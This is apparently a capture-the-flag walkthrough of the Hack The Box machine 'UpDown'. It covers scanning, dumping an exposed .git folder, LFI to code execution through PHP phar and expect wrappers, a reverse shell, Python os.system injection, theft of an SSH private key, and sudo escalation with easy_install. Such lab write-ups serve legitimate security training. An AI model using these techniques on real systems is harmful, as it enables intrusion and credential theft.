# [UpDown](https://app.hackthebox.com/machines/UpDown)

```bash
nmap -p- --min-rate 10000 10.10.11.177 -Pn  
```

![Alt text](img/image.png)

After detection of two open ports (22,80) , let's do greater nmap scan.

```bash
nmap -A -sC -sV -p22,80 10.10.11.177 
```

![Alt text](img/image-1.png)


From page of application, I add ip address into '/etc/hosts' file as 'siteisup.htb'

![Alt text](img/image-2.png)


Let's do directory enumeration via `feroxbuster` tool.

```bash
feroxbuster -u http://siteisup.htb -x php
```

![Alt text](img/image-3.png)


I found `/dev/.git` folder on web application.

![Alt text](img/image-4.png)


To get all data from here, I need to use [git-dumper](https://github.com/arthaud/git-dumper)

I use this script as below.
```bash
python3 git_dumper.py http://siteisup.htb/dev/.git/ /home/kali/Desktop/website/
```

![Alt text](img/image-5.png)


I found `.htaccess` value for dev website that for access purposes, I need to add HTTP request header.

![Alt text](img/image-6.png)


Special-Dev: "only4dev"


For this, I will use this [tool](https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/) to add HTTP request header automatically for each request.

![Alt text](img/image-7.png)



Now, I can access application which is actually during development phase.

![Alt text](img/image-8.png)



I found LFI vulnerability on development application, so that `page` parameter can be infected via PHP wrappers , example is `expect` to execute system commands.

![Alt text](img/image-9.png)

![Alt text](img/image-10.png)


But I cannot turn into reverse shell.


While trying to upload, txt file, I cannot see them on `/uploads` folder due to delete restrictions.

That's why I bypassed this adding a file as compressed ( using `zip`)

```bash
echo "note" > note.txt
zip dr4ks.dr4ks note.txt
```

Now, I can see my file.

![Alt text](img/image-11.png)


Now, let's upload our reverse shell into machine.

1.First, let's create malicious php file.

2.Second, let's `zip` this file.
```bash
zip rev.dr4ks dr4ks.php
```

![Alt text](img/image-12.png)

3.Then, browse our payload as below by using `phar` PHP wrapper which I find LFI.
```bash
curl http://dev.siteisup.htb/?page=phar://uploads/fafdc27087ad17f9556931741b560be7/rev.dr4ks/dr4ks
```

![Alt text](img/image-13.png)



I got reverse shell from port (1337).

![Alt text](img/image-14.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo ;fg
export TERM=xterm
export SHELL=bash
```

![Alt text](img/image-15.png)


I found dev Python scripts in folder called '/home/developer/dev', it means it belongs to `developer` user.

![Alt text](img/image-16.png)

While analyzing binary via `strings` command, I see that 'siteisup_test.py' scripts works also.

![Alt text](img/image-17.png)


Let's run and inject payload into here,
```bash
__import__('os').system('id')
```
![Alt text](img/image-18.png)


Hola, it worked, let's add  shell payload.
```bash
__import__('os').system('bash')
```

![Alt text](img/image-19.png)


Again, I cannot read flag, but I find a solution that I grab private key of this user from his `.ssh` directory.

![Alt text](img/image-20.png)

Let's login into machine as 'developer' user by using his private key (id_rsa) file.

```bash
chmod 600 id_rsa
ssh -i id_rsa developer@10.10.11.177
```


user.txt

![Alt text](img/image-21.png)


For privilege escalation, I just check via `sudo -l` command.

![Alt text](img/image-22.png)


That's `easy_install` binary, I found exploits of this binary on [GTFObins](https://gtfobins.github.io/gtfobins/easy_install/#sudo)

I did all steps and it worked.


root.txt

![Alt text](img/image-23.png)